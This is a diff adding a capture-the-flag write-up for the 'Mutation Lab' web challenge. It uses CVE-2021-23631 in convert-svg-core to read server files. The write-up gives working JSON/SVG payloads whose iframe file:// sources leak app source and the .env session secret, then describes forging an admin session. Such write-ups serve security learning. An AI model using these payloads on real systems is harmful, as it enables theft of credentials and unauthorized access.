@@ -612,6 +612,88 @@ We get our flag:
 <br/>
 
 7. <p name="web7">Mutation Lab (★★☆☆)</p>
+For this one, we didn't get any source code. We get a login/signup page at the given url & after connecting we get the following page:
+
+<p align="center">
+    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/home_web7.png'>
+</p>
+
+The challenge description is the following:
+
+> One of the renowned scientists in
+the research of cell mutation, Dr.
+Rick, was a close ally of Draeger.
+The by-products of his research,
+themutant army wrecked a lot of
+havoc during the energy-crisis
+war. To exterminate the leftover
+mutants that now roam over the
+abandoned areas on the planet
+Vinyr, we need to acquire the cell
+structures produced in Dr. Rick’s
+mutation lab. Ulysses managed
+to find a remote portal with
+minimal access to Dr. Rick’s
+virtual lab. Can you help him
+uncover the experimentations of
+the wicked scientist?
+
+So apparently, we'll need to gain admin access.
+
+Starting to try things out, if we click on the export option, we'll get the svg picture in the home page exported:
+
+<p align="center">
+    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/exported_web7.png'>
+</p>
+
+If we check the request header, we see that we are sending an `svg` image to the server, which then gets exported:
+
+```json
+{
+    "svg":"<svg version=\"1.1\" xmlns=\"http://www.w3.org/2000/svg\" ... -86.89884,0z\"/></g></svg>"
+}
+```
+
+So, we should have a place to start now. After a bit of researching, I found a `CVE-2021-23631` that involved Directory Traversal attack which is affecting `convert-svg-core` module & the first thing we see is:
+
+>  How to fix?
+There is no fixed version for convert-svg-core.
+
+This must be it! The attack is simple, we just add an `iframe` to the svg content & use the `src` attribute to pick our file.
+
+So, we shall leak our source code now, payload:
+
+```json
+{
+    "svg":"<svg-dummy></svg-dummy><iframe src=\"file:///app/index.js\" width=\"100%\" height=\"1000px\"></iframe><svg viewBox=\"0 0 240 80\" height=\"1000\" width=\"1000\" xmlns=\"http://www.w3.org/2000/svg\">  <text x=\"0\" y=\"0\" class=\"Rrrrr\" id=\"demo\">data</text></svg>"
+}
+```
+
+I didn't save the leaked picture but, we'll simply see that we are using a session secret from environment variables. Our next step is to leak the `.env` file:
+
+```json
+{
+    "svg":"<svg-dummy></svg-dummy><iframe src=\"file:///app/.env\" width=\"100%\" height=\"1000px\"></iframe><svg viewBox=\"0 0 240 80\" height=\"1000\" width=\"1000\" xmlns=\"http://www.w3.org/2000/svg\">  <text x=\"0\" y=\"0\" class=\"Rrrrr\" id=\"demo\">data</text></svg>"
+}
+```
+
+And we get the following:
+
+<p align="center">
+    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/env_web7.png'>
+</p>
+
+And our session is (base 64 decoded):
+
+```json
+{
+    "username":"11"
+}
+```
+
+We simply change the username to `admin`, setup a node app using the same session key & get a new signature to use.
+
+Flag: `HTB{fr4m3d_th3_s3cr37s_f0rg3d_th3_entrY}`
 
 <br/>
 
